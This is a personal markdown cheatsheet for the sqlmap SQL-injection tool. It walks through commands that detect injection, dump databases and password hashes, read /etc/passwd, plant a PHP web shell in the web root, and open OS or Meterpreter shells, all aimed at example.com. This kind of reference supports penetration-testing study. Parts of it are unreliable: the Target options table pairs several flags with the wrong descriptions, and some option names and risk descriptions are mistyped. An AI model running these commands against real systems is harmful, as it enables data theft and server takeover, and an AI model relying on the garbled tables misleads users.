---
created: 2026-07-01
tags:
  - web_hacking
  - SQL
  - cheatsheet
status: substantial
---
## `sqlmap`

>[`sqlmap`](https://github.com/sqlmapproject/sqlmap) is a free and open-source penetration testing tool written in Python that automates the detection and exploitation of SQL injection vulnerabilities. 

```bash
python sqlmap.py -u 'https://example.com/index.php?id=1'
```

>[!note]+ Installation
>- Debian-based systems:
>``bash
>sudo apt install sqlmap
>``
>- From source:
>``bash
>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
>``

>[!note]- DBMS `sqlmap` supports:
> - MySQL
> - Oracle
> - PostgreSQL
> - Microsoft SQL Server
> - Microsoft Access
> - IBM DB2
> - SQLite
> - Firebird
> - Sybase
> - SAP MaxDB
> - Informix
> - MariaDB
> - Percona
> - MemSQL
> - TiDB
> - CockroachDB
> - HSQLDB
> - H2
> - MonetDB
> - Apache Derby
> - Amazon Redshift
> - Vertica
> - Mckoi
> - Presto
> - Altibase
> - MimerSQL
> - CrateDB
> - Greenplum
> - Drizzle
> - Apache Ignite
> - Cubrid
> - InterSystems Cache
> - IRIS
> - eXtremeDB
> - FrontBase
## Injection types

- Use the `--technique` option to indicate one or more specific SQLi technique to use:
	- `B`: Boolean-based blind
	- `E`: Error-based
	- `U`: Union query-based
	- `S`: Stacked queries
	- `T`: Time-based blind
	- `Q`: Inline queries
- The default value is `BEUSTQ` (all injection techniques).

```bash
sqlmap --techniques ES -u 'https://example.com/index.php?id=1'
```

- `--techniques ES` uses error-based techniques and stacked queries to test for SQLi.

>[!note] See [Techniques](https://github.com/sqlmapproject/sqlmap/wiki/Usage#techniques).

## Running SQLMap on an HTTP request

### `GET`/`POST` requests

- `GET` parameters are provided in the URL specified via `-u`/`--url`:

```bash
sqlmap -u 'https://example.com/?q=test&order_by=2'
```

- `POST` data can be specified using the `--data` flag:

```bash
sqlmap -u 'https://example.com/' --data 'q=test&order_by=2'
```

>[!important] By default, SQLMap tests all parameters specified in the request.

| Option        | Description                                          |
| ------------- | ---------------------------------------------------- |
| `-u`, `--url` | Target URL (e.g. `https://example.com/index.php?id=1`.    |
| `--data`      | Data string to be sent through POST (e.g. `"id=1"`). |
### Testing specific parameters

- To test a specific parameter, either indicate it using the `-p` option or mark it with an asterisk `*` right in the request:

```bash
sqlmap -u 'https://example.com/?q=test&order_by=2*'
```

```bash
sqlmap -u 'https://example.com/?q=test&order_by=2' -p order_by
```

- To skip specific parameters (or HTTP requests, when using `--level=5`), use the `--skip` option:

```bash
sqlmap -u 'https://example.com/?q=test&order_by=2*&author=Jane+Doe&sort=ASC' --skip='q'
```

- For complex HTTP requests, it's convenient to first save the request in a text file and then specify it to SQLMap using the `-r` option:

```bash
sqlmap -r request.txt
```

```bash
cat request.txt
```
``
```http
GET /index.php HTTP/1.1
Host: example.com
Pragma: no-cache
Cache-Control: no-cache
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://154.57.164.67:30881/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

- This comes especially handy when you're dealing with a web proxy like Burp, where you see full requests and can copy them easily.

>[!important] The `sqlmap` switch `--no-cast` **turns off the payload casting mechanism**, which normally converts all retrieved data entries to string types and replaces `NULL` values with whitespace to prevent errors during concatenation.

| Option      | Description                                       |
| ----------- | ------------------------------------------------- |
| `-p`        | Parameter(s) to test.                             |
| `--skip`    | Skip testing for given parameter(s).              |
| `-r`        | Specify a test file with an HTTP request to test. |
| `--no-cast` | Turn off payload casting mechanism.               |
### Request options

- Specify additional headers:

```bash
sqlmap -u 'https://example.com/index.php?id=1' \
	-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0'
```

- Specify cookies:

```bash
sqlmap -u "https://example.com/index.php?id=1" \
	-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' \
	--cookie='session=tihDvvlaeD6mr19ZIzAEqko3GyO4lKa3'
```

- Specify an HTTP method other than `GET` or `POST`:

```bash
sqlmap -u 'https://example.com/' --data 'q=test&order_by=2' --method PUT
```

| Option           | Description                                                |
| ---------------- | ---------------------------------------------------------- |
| `-H`, `--header` | Extra header (e.g. `"X-Forwarded-For: 127.0.0.1"`).        |
| `--cookie`       | HTTP `Cookie` header value (e.g. `"PHPSESSID=a8d127e.."`). |
| `--method`       | Force usage of given HTTP method (e.g. `PUT`).             |

### SQL injection in cookies and other HTTP headers

- Test for SQLi in a cookie parameter:

```bash
sqlmap -u "https://example.com" --cookie="session_id=123; user_id=*" -p "user_id" --level=2 --batch   
```

- SQLMap tests different parts of the requests depending on the specified `--level` (default: `1`).
### cURL commands

One of the easiest ways to properly set up an SQLMap command for a complex HTTP request us to use the `Copy as a cURL` feature in browser Developer Tools or Burp Suite:

- In browser DevTools (showed for Chrome), to go `Network` -> right-click the target request -> `Copy` -> `Copy as a cURL`: 

![[copy_as_curl_devtools.png]]

- In Burp Suite, to go `Proxy` -> `HTTP history` -> right-click the target request -> `Copy as a curl command (bash)`:

![[copy_as_a_curl_command.png]]

- Then paste the clipboard content into the terminal and change the original command from `curl` to `sqlmap`; you can also remove unnecessary headers (such as`Accept-*`). Add `sqlmap`-specific options, and you're ready to go:

```bash
sqlmap 'https://example.com/index.php' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' \
  --dbs \
  --tables
```

## Sessions

`sqlmap` automatically saves scan progress in a session file, so you can stop execution anytime and later resume your work. 

```bash
sqlmap -u 'https://example.com/index.php?id=1'
```

- `sqlmap` creates a session under its output directory (typically something like `~/.local/share/sqlmap/output/<target>/` on Linux, depending on your installation).
- The session stores information such as:
	- Detected injection points
	- Database fingerprinting results
	- Enumerated databases/tables
	- Retrieved data
	- Other cached scan results

- To resume a session, simply rerun the same command against the same target.

```bash
sqlmap -u 'https://example.com/index.php?id=1'
```

- To specify a custom output directory, use `--output-dir`:

```bash
sqlmap -u 'https://example.com/index.php?id=1' \
  --output-dir=/home/user/sqlmap-sessions
```

- Running the same command later with the same `--output-dir` lets `sqlmap` reuse the stored session.

- If you want to ignore previous results and start fresh:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --flush-session
```

- You can inspect the output directory:

```bash
ls ~/.local/share/sqlmap/output/
```

```bash
example.com/  
├── session.sqlite  
├── log  
├── target.txt  
└── dump/
```

- The `session.sqlite` file contains the cached session data.


| Option            | Description                                  |
| ----------------- | -------------------------------------------- |
| `--output-dir`    | Custom output directory path.                |
| `--fresh-queries` | Ignore query results stored in session file. |

## Database enumeration

### Context and metadata

- Retrieve database version banner:

```bash
sqlmap -u 'https://example.com/?q=test&order_by=2' --banner
```

- Current user:

```bash
sqlmap -u 'https://example.com/?q=test&order_by=2' --current-user
```

 - Current database:

```bash
sqlmap -u 'https://example.com/?q=test&order_by=2' --current-db
```

- Get the current user and determine it has DBA (Database Administrator) rights:

```bash
sqlmap -u 'https://example.com/?q=test&order_by=2' --current-user --is-dba
```

| Option           | Description                             |
| ---------------- | --------------------------------------- |
| `-a`, `--all`    | Retrieve everything.                    |
| `-b`, `--banner` | Retrieve DBMS banner.                   |
| `--current-user` | Retrieve DBMS current user.             |
| `--current-db`   | Retrieve DBMS current database.         |
| `--hostname`     | Retrieve DBMS server hostname.          |
| `--is-dba`       | Detect if the DBMS current user is DBA. |
| `--users`        | Enumerate DBMS users.                   |
| `--passwords`    | Enumerate DBMS users password hashes.   |
| `--privileges`   | Enumerate DBMS users privileges.        |
| `--roles`        | Enumerate DBMS users roles.             |

### Retrieving data

- Dump database table entries:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --dump
```

- Retrieve entries form all databases:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --dump-all
```

- Retrieve entries form all databases excluding system databases:


```bash
sqlmap -u 'https://example.com/index.php?id=1' --dump-all --exclude-sysdbs
```


>[!tip] Use `--batch` to never ask for user input and always use the default behavior (`[Y/n]`/`[y/N]` questions).

- Enumerate available databases:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --dbs
```


- List tables in the selected database:

```bash
sqlmap -u 'https://example.com/index.php?id=1' -D 'public' --tables
```

- Enumerate columns of a specific table:

```bash
sqlmap -u 'https://example.com/index.php?id=1' -D 'public' -T 'users' --columns
```

- Extract data from a specific table in the defined columns:

```bash
sqlmap -u 'https://example.com/index.php?id=1' -D 'public' -T 'users' -C 'username,password' --dump
```

| Option                          | Description                                            |
| ------------------------------- | ------------------------------------------------------ |
| `--tables`                      | Enumerate DBMS database tables.                        |
| `--dbs`                         | Enumerate DBMS databases.                              |
| `--columns`                     | Enumerate DBMS database table columns.                 |
| `--schema`                      | Enumerate DBMS schema.                                 |
| `--count`                       | Retrieve number of entries for table(s).               |
| `--dump`                        | Dump DBMS database table entries.                      |
| `--dump-all`                    | Dump all DBMS databases tables entries.                |
| `--search`                      | Search column(s), table(s) and/or database name(s).    |
| `--comments`                    | Check for DBMS comments during enumeration.            |
| `--statements`                  | Retrieve SQL statements being run on DBMS.             |
| `-D <db>`                       | DBMS database to enumerate.                            |
| `-T <tbl>`                      | DBMS database table(s) to enumerate.                   |
| `-C <col>`                      | DBMS database table column(s) to enumerate.            |
| `-X <exclude>`                  | DBMS database identifier(s) to not enumerate.          |
| `-U <user>`                     | DBMS user to enumerate.                                |
| `--exclude-sysdbs`              | Exclude DBMS system databases when enumerating tables. |
| `--pivot-column=<pivot_column>` | Pivot column name.                                     |
| `--where=<dump_where>`          | Use `WHERE` condition while table dumping.             |
| `--start=<limit_start>`         | First dump table entry to retrieve.                    |
| `--stop=<limit_stop>`           | Last dump table entry to retrieve.                     |
| `--first=<first_char>`          | First query output word character to retrieve.         |
| `--last=<last_char>`            | Last query output word character to retrieve.          |
| `--sql-query=<sql_query>`       | SQL statement to be executed.                          |
| `--sql-shell`                   | Prompt for an interactive SQL shell.                   |
| `--sql-file=<sql_file>`         | Execute SQL statements from given file(s).             |

## Handling errors

- When you face a problem running SQLMap, one of the first steps to identify its cause is to use `--parse-errors` to parse DBMS errors (if any) and display them as part of the program run:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --dump --batch --parse-errors
```

## Output

- Store all the traffic (complete request sand responses) into a file:

```bash
sqlmap -u 'https://example.com/index.php?id=1' -t /tmp/sqlmap-traffic.txt
```

- Specify verbosity level: 

```bash
sqlmap -u 'https://example.com/index.php?id=1' -t /tmp/sqlmap-traffic.txt -v 6
```

- Verbosity levels:
	- `0`: Only errors, critical messages, and Python tracebacks.
	- `1` (default): Information, warnings, errors. 
	- `2`: Debug messages, in addition to level `1`. 
	- `3`: SQL injection payloads being sent, in addition to level `2`.
	- `4`: Full HTTP *requests*, in addition to level `3`. 
	- `5`: HTTP *response* headers, in addition to level `4`.
	- `6`: Full HTTP response body (page content), in addition to level `5`.

| Option | Description                                |
| ------ | ------------------------------------------ |
| `-t`   | Log all HTTP traffic into a textual file.  |
| `-v`   | Verbosity level: `0` to `6` (default `1`). |

## Using proxy

- To pass traffic through a proxy, use the `--proxy` option:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --dump --proxy https://localhost:8080
```

>[!burp]+ `--proxy https://localhost:8080` passes traffic through Burp Suite (when it's running), unless the default listening address (`localhost:8080`) has been changed.

## Customizing payloads

- To add a special prefix to payloads:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --prefix="'))" --dump
```

- To add a special suffix to payloads:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --suffix="-- -" --dump
```

| Option              | Description                      |
| ------------------- | -------------------------------- |
| `--prefix=<prefix>` | Injection payload prefix string. |
| `--suffix=<suffix>` | Injection payload suffix string. |

## Level and risk

- **`--level` = breadth** (`1`-`5`):
	- Which HTTP request parameters are tested for SQLi (`GET`, `POST` parameters, cookies, etc.)?
	- How many payloads are tested?
	- How many payload variations are tested?


| Level                 | Description                                                                                                                                                                  |
| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--level=1` (default) | **`GET` parameters**<br>**`POST` parameters**                                                                                                                                |
| `--level=2`           | Level `1` +<br>**HTTP cookie values**                                                                                                                                        |
| `--level=3`           | Level `2` +<br>HTTP **`User-Agent`** header<br>HTTP **`Referer`** header                                                                                                     |
| `--level=4`           | Level `3` +<br>More exhaustive testing using:<br>`∘` More payload variants<br>`∘` More prefix/suffix combinations<br>`∘` More DBMS-specific tests<br>No new locations added. |
| `--level=5`           | Maximum testing.<br>The largest payload and boundary set, additional `UNION` tests.                                                                                          |

>[!note] For `UNION`-based SQL injection, SQLMap test `1`-`10` columns by default (level `1`). Higher levels increase this automatically (up to `50` columns).

- **`--risk` = aggressiveness** (`1`-`3`): 
	- What payloads can SQLMap send?
	- How potentially disruptive can the payloads be?

| Risk       | Description                                                                                                                                                                                                                       |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--risk=1` | Safe for most situations.<br>`∘` Boolean-based<br>`∘` Error-based<br>`∘` `UNION`-based<br>`∘` Normal time-based payloads                                                                                                          |
| `--risk=2` | Risk `1` + <br>Time-consuming / computationally-expensive payloads.<br>`∘` Sleep/wait queries (e.g., `SLEEP()`, `WAITFOR DELAY`)<br>`∘` Cartesian joins<br>`∘` Computationally-expensive queries<br>`∘` CPU-intensive expressions |
| `--risk=3` | Risk `3` + <br>`OR`-based tests.                                                                                                                                                                                                  |

- `--risk` and `--level` are independent, but can be combined.

| Command              | Purpose                                                                                                                                                                                                               |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--level=1 --risk=1` | Fast, safe initial scan (default).                                                                                                                                                                                    |
| `--level=3 --risk=1` | Common choice to include Cookies, User-Agent, and Referer without enabling riskier payloads.                                                                                                                          |
| `--level=5 --risk=1` | Exhaustive but still relatively conservative in payload selection.                                                                                                                                                    |
| `--level=5 --risk=2` | Deep testing with heavy time-based techniques when normal delays are ineffective.                                                                                                                                     |
| `--level=5 --risk=3` | Maximum coverage, including OR-based payloads that may have unintended effects on certain SQL statements; appropriate only when you understand and accept those risks and have authorization to perform such testing. |

## OS exploitation

- SQLMap includes post-exploitation functionality that leverage an already-confirmed SQL injection endpoint to interact with the underlying host.
- What you can do depends on the specific features of the target DBMS (stacked queries, `xp_cmdshell`, `lo_import`/`lo_export`, `INTO OUTFILE`, user-defined functions) and privileges of the current database user.

> [!note]- DBMS support for OS-level access
> 
> | DBMS                 | Mechanism                                                            | Typical requirement                                                 |
> | -------------------- | -------------------------------------------------------------------- | ------------------------------------------------------------------- |
> | MySQL/MariaDB        | UDF injection (`sys_exec`/`sys_eval`), `INTO OUTFILE` web shell drop | `FILE` privilege, writable web root, permissive `secure_file_priv`  |
> | Microsoft SQL Server | `xp_cmdshell`, stacked queries                                       | `sysadmin`, or rights to re-enable `xp_cmdshell` via `sp_configure` |
> | PostgreSQL           | UDF injection via `lo_import`/`lo_export`, stacked queries           | Superuser role                                                      |
> | Oracle               | Java- or `DBMS_SCHEDULER`-based command execution                    | Elevated roles (e.g. `DBA`, `JAVA_ADMIN`)                           |

### Interactive OS shell


- Before attempting to get a full interactive shell, first check if you can execute commands on the target host using `--os-cmd`, which is used to execute a single specified command:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --os-cmd="id" --batch
```

- If you see the result of the specified command, it's likely you can get a shell with `--os-shell`:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --os-shell --batch
```


- To spawn an out-of-band Meterpreter shell:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --os-pwn --msf-path=/usr/share/metasploit-framework
```


| Option                  | Description                                            |
| ----------------------- | ------------------------------------------------------ |
| `--os-cmd`              | Execute an operating system command.                   |
| `--os-shell`            | Prompt for an interactive operating system shell.      |
| `--os-pwn`              | Prompt for an OOB shell, Meterpreter or VNC.           |
| `--os-smbrelay`         | One-click prompt for an OOB shell, Meterpreter or VNC. |
| `--os-bof`              | Stored procedure buffer overflow exploitation.         |
| `--priv-esc`            | Database process user privilege escalation.            |
| `--msf-path=<msf_path>` | Local path where Metasploit Framework is installed.    |
| `--tmp-path=<tmp_path>` | Remote absolute path of temporary files directory.     |

### File system access

- Read a file:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --file-read='/etc/passwd'
```

- Write a file:

```bash
sqlmap -u 'https://example.com/index.php?id=1' --file-write='shell.php' --file-dest='/var/www/html/shell.php'
```

>[!important] File read/write almost always requires the same elevated privileges as OS command execution (`FILE` in MySQL, superuser in PostgreSQL, an `xp_cmdshell`-capable context in Microsoft SQL Server). If `--file-read` silently returns nothing, confirm privileges with `--is-dba` and `--privileges` before assuming the technique doesn't apply to the target.

|Option|Description|
|---|---|
|`--file-read=<file_read>`|Read a file from the back-end DBMS file system.|
|`--file-write=<file_write>`|Write a local file to the back-end DBMS file system.|
|`--file-dest=<file_dest>`|Back-end DBMS absolute filepath to write to.|

### Windows registry access (MSSQL only)

- On MSSQL, `sqlmap` can interact with Windows registry of the DBMS host given sufficient privileges.

```bash
sqlmap -u 'https://example.com/index.php?id=1' --reg-read --reg-key='HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion' --reg-value='ProductName'
```

>[!important] Reads, writes, or deletes registry keys via `xp_regread`/`xp_regwrite`/`xp_regdeletekey` extended stored procedures requires `sysadmin` user.

## Customizing `UNION`-based exploitaiton


## Option reference

| Option         | Description                                |
| -------------- | ------------------------------------------ |
| `-h`, `--help` | Show basic help message and exit.          |
| `-hh`          | Show advanced help message and exit.       |
| `--version`    | Show program's version number and exit.    |
| `-v <verbose>` | Verbosity level: `0` to `6` (default `1`). |

- Verbosity levels:
	- `0`: Only errors, critical messages, and Python tracebacks.
	- `1` (default): Information, warnings, errors. 
	- `2`: Debug messages, in addition to level `1`. 
	- `3`: SQL injection payloads being sent, in addition to level `2`.
	- `4`: Full HTTP *requests*, in addition to level `3`. 
	- `5`: HTTP *response* headers, in addition to level `4`.
	- `6`: Full HTTP response body (page content), in addition to level `5`.


| Option   | Equivalent |
| -------- | ---------- |
| `-v`     | `-v 2`     |
| `-vv`    | `-v 3`     |
| `-vvv`   | `-v 4`     |
| `-vvvv`  | `-v 5`     |
| `-vvvvv` | `-v 6`     |

### Target

>[!note] At least one of these options must be provided to define the target(s).

| Option                    | Description                                               |
| ------------------------- | --------------------------------------------------------- |
| `-u <url>`, `--url=<url>` | Target URL (e.g., `"https://www.site.com/vuln.php?id=1"`). |
| `-l <logfile>`            | Connection string for direct database connection.         |
| `-m <bulkfile>`           | Parse target(s) from Burp or WebScarab proxy log file.    |
| `-r <requestfile>`        | Specify a test file with an HTTP request to test.         |
| `-g <googledork>`         | Load HTTP request from a file.                            |
| `-c <configfile>`         | Process Google dork results as target URLs.               |
| `-d <direct>`             | Load options from a configuration INI file.               |


### Request

| Option                 | Description                                                                                                 |
| ---------------------- | ----------------------------------------------------------------------------------------------------------- |
| `-A` , `--user-agent=` | HTTP `User-Agent` header value.                                                                             |
| `-H`, `--header`       | Extra header (e.g. `"X-Forwarded-For: 127.0.0.1"`).                                                         |
| `--method`             | Force usage of given HTTP method (e.g. `PUT`).                                                              |
| `--data`               | Data string to be sent through POST (e.g. `"id=1"`).                                                        |
| `--param-del`          | Character used for splitting parameter values (e.g. `&`).                                                   |
| `--cookie`             | HTTP `Cookie` header value (e.g. `"PHPSESSID=a8d127e.."`).                                                  |
| `--cookie-del`         | Character used for splitting cookie values (e.g. `;`).                                                      |
| `--live-cookies`       | Live cookies file used for loading up-to-date values.                                                       |
| `--load-cookies`       | File containing cookies in Netscape/`wget` format.                                                          |
| `--drop-set-cookie`    | Ignore `Set-Cookie` header from response.                                                                   |
| `--mobile`             | Imitate smartphone through HTTP `User-Agent` header.                                                        |
| `--random-agent`       | Use randomly selected HTTP `User-Agent` header value.                                                       |
| `--host=`              | HTTP `Host` header value.                                                                                   |
| `--referer=`           | HTTP `Referer` header value.                                                                                |
| `--headers=`           | Extra headers (e.g. `"Accept-Language: fr\nETag: 123"`).                                                    |
| `--auth-type=`         | HTTP authentication type (`Basic`, `Digest`, `NTLM` or `PKI`).                                              |
| `--auth-cred=`         | HTTP authentication credentials (`name:password`).                                                          |
| `--auth-file=`         | HTTP authentication PEM cert/private key file.                                                              |
| `--ignore-code=`       | Ignore (problematic) HTTP error code (e.g. `401`).                                                          |
| `--ignore-proxy`       | Ignore system default proxy settings.                                                                       |
| `--ignore-redirects`   | Ignore redirection attempts.                                                                                |
| `--ignore-timeouts`    | Ignore connection timeouts.                                                                                 |
| `--proxy=`             | Use a proxy to connect to the target URL.                                                                   |
| `--proxy-cred=`        | Proxy authentication credentials (`name:password`).                                                         |
| `--proxy-file=`        | Load proxy list from a file.                                                                                |
| `--proxy-freq=`        | Requests between change of proxy from a given list.                                                         |
| `--tor`                | Use Tor anonymity network.                                                                                  |
| `--tor-port=`          | Set Tor proxy port other than default.                                                                      |
| `--tor-type=`          | Set Tor proxy type (`HTTP`, `SOCKS4` or `SOCKS5` (default)).                                                |
| `--check-tor`          | Check to see if Tor is used properly.                                                                       |
| `--delay=`             | Delay in seconds between each HTTP request.                                                                 |
| `--timeout=`           | Seconds to wait before timeout connection (default `30`).                                                   |
| `--retries=`           | Retries when the connection timeouts (default `3`).                                                         |
| `--randomize=`         | Randomly change value for given parameter(s).                                                               |
| `--safe-url=`          | URL address to visit frequently during testing.                                                             |
| `--safe-post=`         | POST data to send to a safe URL.                                                                            |
| `--safe-req=`          | Load safe HTTP request from a file.                                                                         |
| `--safe-freq=`         | Regular requests between visits to a safe URL.                                                              |
| `--skip-urlencode`     | Skip URL encoding of payload data.                                                                          |
| `--csrf-token=`        | Parameter used to hold anti-CSRF token.                                                                     |
| `--csrf-url=`          | URL address to visit for extraction of anti-CSRF token.                                                     |
| `--csrf-method=`       | HTTP method to use during anti-CSRF token page visit.                                                       |
| `--csrf-retries=`      | Retries for anti-CSRF token retrieval (default `0`).                                                        |
| `--force-ssl`          | Force usage of `SSL/HTTPS`.                                                                                 |
| `--chunked`            | Use HTTP chunked transfer encoded (`POST`) requests.                                                        |
| `--hpp`                | Use HTTP parameter pollution method.                                                                        |
| `--eval=`              | Evaluate provided Python code before the request (e.g. `"import hashlib;id2=hashlib.md5(id).hexdigest()"`). |

### Optimization

| Option                | Description                                              |
| --------------------- | -------------------------------------------------------- |
| `-o`                  | Turn on all optimization switches.                       |
| `--predict-output`    | Predict common queries output.                           |
| `--no-keep-alive`     | Disable persistent HTTP(s) connections (`Keep-Alive`).   |
| `--null-connection`   | Retrieve page length without actual HTTP response body.  |
| `--threads=<threads>` | Max number of concurrent HTTP(s) requests (default `1`). |



### Injection

| Option                            | Description                                                |
| --------------------------------- | ---------------------------------------------------------- |
| `-p <test_parameter>`             | Parameter(s) to test.                                      |
| `--skip=<skip>`                   | Skip testing for given parameter(s).                       |
| `--skip-static`                   | Skip testing parameters that do not appear to be dynamic.  |
| `--param-exclude=<param_exclude>` | Regexp to exclude parameters from testing (e.g., `"ses"`). |
| `--param-filter=<param_filter>`   | Select testable parameter(s) by place (e.g., `"POST"`).    |
| `--dbms=<dbms>`                   | Force back-end DBMS to provided value.                     |
| `--dbms-cred=<dbms_cred>`         | DBMS authentication credentials (`user:password`).         |
| `--os=<os>`                       | Force back-end DBMS operating system to provided value.    |
| `--invalid-bignum`                | Use big numbers for invalidating values.                   |
| `--invalid-logical`               | Use logical operations for invalidating values.            |
| `--invalid-string`                | Use random strings for invalidating values.                |
| `--no-cast`                       | Turn off payload casting mechanism.                        |
| `--no-escape`                     | Turn off string escaping mechanism.                        |
| `--prefix=<prefix>`               | Injection payload prefix string.                           |
| `--suffix=<suffix>`               | Injection payload suffix string.                           |
| `--tamper=<tamper>`               | Use given script(s) for tampering injection data.          |
| `--proof`                         | Prove exploitation of the detected injection point(s).     |


- `--dbms` parameter:
	- 
### Detection

| Option                     | Description                                                                                     |
|----------------------------|-------------------------------------------------------------------------------------------------|
| `--level=<level>`       | Level of tests to perform (`1` to `5`, default `1`).                                           |
| `--risk=<risk>`         | Risk of tests to perform (`1` to `3`, default `1`).                                           |
| `--string=<string>`     | String to match when query is evaluated to `True`.                                             |
| `--not-string=<not_string>` | String to match when query is evaluated to `False`.                                          |
| `--regexp=<regexp>`     | Regexp to match when query is evaluated to `True`.                                             |
| `--code=<code>`         | HTTP code to match when query is evaluated to `True`.                                          |
| `--smart`               | Perform thorough tests only if positive heuristic(s).                                          |
| `--text-only`           | Compare pages based only on the textual content.                                               |
| `--titles`              | Compare pages based only on their titles.                                                       |

- `--risk` levels:
	- `--risk=1`: Innocuous payloads that are generally harmless to the database, such as basic boolean-based and error-based tests.
	- `--risk=2`: Adds time-based SQL injection tests using sleep commands or heavy time-consuming queries (e.g., `SLEEP()`, `BENCHMARK()`), which can slow down or temporarily take down the database.
	- `--risk=3`: Includes **`OR`-based** SQL injection tests and potentially destructive payloads that may **update all entries** of a table or modify data.

- `--level` looks for more injection points (parameters to test) beyond `GET`/`POST` parameters — such as cookies and other HTTP headers — and also preforms more tests for each parameter.
	- `--level=1`: Always (<`100` requests).
	- `--level=2`: Try a bit harder (`100`-`200` requests).
	- `--level=3`: Good number of requests (`200`-`500` requests).
	- `--level=4`: Extensive test (`500`-`1000` requests).
	- `--level=5`: You have plenty of time (>`1000` requests).

>[!note] See [`What are the consequences of increasing the "--risk" option of sqlmap?— StackExchange`](https://security.stackexchange.com/questions/162979/what-are-the-consequences-of-increasing-the-risk-option-of-sqlmap).
### Techniques

| Option                     | Description                                                                                     |
|----------------------------|-------------------------------------------------------------------------------------------------|
| `--technique=<technique>` | SQL injection techniques to use (default `"BEUSTQ"`).                                       |
| `--time-sec=<time_sec>` | Seconds to delay the DBMS response (default `5`).                                             |
| `--disable-stats`       | Disable the statistical model for detecting the delay.                                         |
| `--union-cols=<ucols>`  | Range of columns to test for `UNION` query SQL injection.                                      |
| `--union-char=<uchar>`  | Character to use for bruteforcing number of columns.                                           |
| `--union-from=<ufrom>`  | Table to use in `FROM` part of `UNION` query SQL injection.                                    |
| `--union-values=<uvalues>` | Column values to use for `UNION` query SQL injection.                                        |
| `--dns-domain=<dns_domain>` | Domain name used for DNS exfiltration attack.                                                |
| `--second-url=<second_url>` | Resulting page URL searched for second-order response.                                       |
| `--second-req=<second_req>` | Load second-order HTTP request from file.                                                     |


### Fingerprint

| Option                     | Description                                                                                     |
|----------------------------|-------------------------------------------------------------------------------------------------|
| `-f`, `--fingerprint` | Perform an extensive DBMS version fingerprint.                                                 |

### Enumeration

| Option                          | Description                                            |
| ------------------------------- | ------------------------------------------------------ |
| `-a`, `--all`                   | Retrieve everything.                                   |
| `-b`, `--banner`                | Retrieve DBMS banner.                                  |
| `--current-user`                | Retrieve DBMS current user.                            |
| `--current-db`                  | Retrieve DBMS current database.                        |
| `--hostname`                    | Retrieve DBMS server hostname.                         |
| `--is-dba`                      | Detect if the DBMS current user is DBA.                |
| `--users`                       | Enumerate DBMS users.                                  |
| `--passwords`                   | Enumerate DBMS users password hashes.                  |
| `--privileges`                  | Enumerate DBMS users privileges.                       |
| `--roles`                       | Enumerate DBMS users roles.                            |
| `--dbs`                         | Enumerate DBMS databases.                              |
| `--tables`                      | Enumerate DBMS database tables.                        |
| `--columns`                     | Enumerate DBMS database table columns.                 |
| `--schema`                      | Enumerate DBMS schema.                                 |
| `--count`                       | Retrieve number of entries for table(s).               |
| `--dump`                        | Dump DBMS database table entries.                      |
| `--dump-all`                    | Dump all DBMS databases tables entries.                |
| `--search`                      | Search column(s), table(s) and/or database name(s).    |
| `--comments`                    | Check for DBMS comments during enumeration.            |
| `--statements`                  | Retrieve SQL statements being run on DBMS.             |
| `-D <db>`                       | DBMS database to enumerate.                            |
| `-T <tbl>`                      | DBMS database table(s) to enumerate.                   |
| `-C <col>`                      | DBMS database table column(s) to enumerate.            |
| `-X <exclude>`                  | DBMS database identifier(s) to not enumerate.          |
| `-U <user>`                     | DBMS user to enumerate.                                |
| `--exclude-sysdbs`              | Exclude DBMS system databases when enumerating tables. |
| `--pivot-column=<pivot_column>` | Pivot column name.                                     |
| `--where=<dump_where>`          | Use `WHERE` condition while table dumping.             |
| `--start=<limit_start>`         | First dump table entry to retrieve.                    |
| `--stop=<limit_stop>`           | Last dump table entry to retrieve.                     |
| `--first=<first_char>`          | First query output word character to retrieve.         |
| `--last=<last_char>`            | Last query output word character to retrieve.          |
| `--sql-query=<sql_query>`       | SQL statement to be executed.                          |
| `--sql-shell`                   | Prompt for an interactive SQL shell.                   |
| `--sql-file=<sql_file>`         | Execute SQL statements from given file(s).             |


### Brute Force

| Option                     | Description                                                                                     |
|----------------------------|-------------------------------------------------------------------------------------------------|
| `--common-tables`        | Check existence of common tables.                                                               |
| `--common-columns`       | Check existence of common columns.                                                              |
| `--common-files`         | Check existence of common files.                                                                |

### User-defined function injection

| Option                   | Description                           |
| ------------------------ | ------------------------------------- |
| `--udf-inject`         | Inject custom user-defined functions. |
| `--shared-lib=<shlib>` | Local path of the shared library.     |


### Filesystem access

| Option                        | Description                                          |
| ----------------------------- | ---------------------------------------------------- |
| `--file-read=<file_read>`   | Read a file from the back-end DBMS file system.      |
| `--file-write=<file_write>` | Write a local file on the back-end DBMS file system. |
| `--file-dest=<file_dest>`   | Back-end DBMS absolute filepath to write to.         |

